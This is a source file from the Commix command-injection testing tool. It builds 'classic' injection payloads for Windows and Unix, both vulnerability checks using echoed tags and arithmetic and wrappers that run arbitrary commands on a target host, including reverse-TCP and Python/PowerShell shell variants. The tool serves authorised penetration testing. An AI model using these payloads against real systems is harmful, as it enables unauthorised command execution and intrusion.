"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""
from src.utils import settings
'\nThe classic injection technique on Classic OS Command Injection.\nThe available "classic" payloads.\n'
'\nClassic decision payload (check if host is vulnerable).\n'

def decision(separator, TAG, randv1, randv2):
    if False:
        while True:
            i = 10
    if settings.TARGET_OS == settings.OS.WINDOWS:
        if settings.SKIP_CALC:
            payload = separator + 'echo ' + TAG + TAG + TAG + settings.CMD_NUL
        else:
            payload = separator + 'for /f "tokens=*" %i in (\'cmd /c "' + 'set /a (' + str(randv1) + '%2B' + str(randv2) + ')' + '"\') do @set /p = ' + TAG + '%i' + TAG + TAG + settings.CMD_NUL
    else:
        if not settings.WAF_ENABLED:
            if settings.USE_BACKTICKS:
                math_calc = '`expr ' + str(randv1) + ' %2B ' + str(randv2) + '`'
            else:
                math_calc = '$((' + str(randv1) + '%2B' + str(randv2) + '))'
        elif settings.USE_BACKTICKS:
            math_calc = '`expr ' + str(randv1) + ' %2B ' + str(randv2) + '`'
        else:
            math_calc = '$(expr ' + str(randv1) + ' %2B ' + str(randv2) + ')'
        if settings.SKIP_CALC:
            if settings.USE_BACKTICKS:
                payload = separator + 'echo ' + TAG + TAG + '' + TAG + ''
            else:
                payload = separator + 'echo ' + TAG + '$(echo ' + TAG + ')' + TAG + ''
        elif settings.USE_BACKTICKS:
            payload = separator + 'echo ' + TAG + math_calc + TAG + '' + TAG + ''
        else:
            payload = separator + 'echo ' + TAG + math_calc + '$(echo ' + TAG + ')' + TAG + ''
    return payload
'\n__Warning__: The alternative shells are still experimental.\n'

def decision_alter_shell(separator, TAG, randv1, randv2):
    if False:
        return 10
    if settings.TARGET_OS == settings.OS.WINDOWS:
        if settings.SKIP_CALC:
            python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c "print(\'' + TAG + "'%2B'" + TAG + "'%2B'" + TAG + '\')"'
        else:
            python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c "print(\'' + TAG + "'%2Bstr(int(" + str(int(randv1)) + '%2B' + str(int(randv2)) + '))' + "%2B'" + TAG + "'%2B'" + TAG + '\')"'
        payload = separator + 'for /f "tokens=*" %i in (\'cmd /c ' + python_payload + "') do @set /p=%i " + settings.CMD_NUL
    elif settings.SKIP_CALC:
        payload = separator + settings.LINUX_PYTHON_INTERPRETER + ' -c "print(\'' + TAG + TAG + TAG + '\')"'
    else:
        payload = separator + settings.LINUX_PYTHON_INTERPRETER + ' -c "print(\'' + TAG + "'%2Bstr(int(" + str(int(randv1)) + '%2B' + str(int(randv2)) + '))' + "%2B'" + TAG + "'%2B'" + TAG + '\')"'
    return payload
'\nExecute shell commands on vulnerable host.\n'

def cmd_execution(separator, TAG, cmd):
    if False:
        return 10
    if settings.TARGET_OS == settings.OS.WINDOWS:
        if settings.REVERSE_TCP:
            payload = separator + cmd + settings.SINGLE_WHITESPACE
        else:
            payload = separator + 'for /f "tokens=*" %i in (\'cmd /c "' + cmd + '"\') do @set /p = ' + TAG + TAG + '%i' + TAG + TAG + settings.CMD_NUL
    else:
        settings.USER_SUPPLIED_CMD = cmd
        if settings.USE_BACKTICKS:
            cmd_exec = '`' + cmd + '`'
            payload = separator + 'echo ' + TAG + '' + TAG + '' + cmd_exec + '' + TAG + '' + TAG + ''
        else:
            cmd_exec = '$(' + cmd + ')'
            payload = separator + 'echo ' + TAG + '$(echo ' + TAG + ')' + cmd_exec + '$(echo ' + TAG + ')' + TAG + ''
    return payload
'\n__Warning__: The alternative shells are still experimental.\n'

def cmd_execution_alter_shell(separator, TAG, cmd):
    if False:
        i = 10
        return i + 15
    if settings.TARGET_OS == settings.OS.WINDOWS:
        if settings.REVERSE_TCP:
            payload = separator + cmd + settings.SINGLE_WHITESPACE
        else:
            payload = separator + 'for /f "tokens=*" %i in (\'' + settings.WIN_PYTHON_INTERPRETER + ' -c "import os; os.system(\'powershell.exe -InputFormat none write-host ' + TAG + TAG + ' $(' + cmd + ') ' + TAG + TAG + '\')"' + "') do @set /p=%i " + settings.CMD_NUL
    elif settings.USE_BACKTICKS:
        payload = separator + settings.LINUX_PYTHON_INTERPRETER + ' -c "print(\'' + TAG + "'%2B'" + TAG + "'%2B'$(echo `" + cmd + ')`' + TAG + "'%2B'" + TAG + '\')"'
    else:
        payload = separator + settings.LINUX_PYTHON_INTERPRETER + ' -c "print(\'' + TAG + "'%2B'" + TAG + "'%2B'$(echo $(" + cmd + "))'%2B'" + TAG + "'%2B'" + TAG + '\')"'
    return payload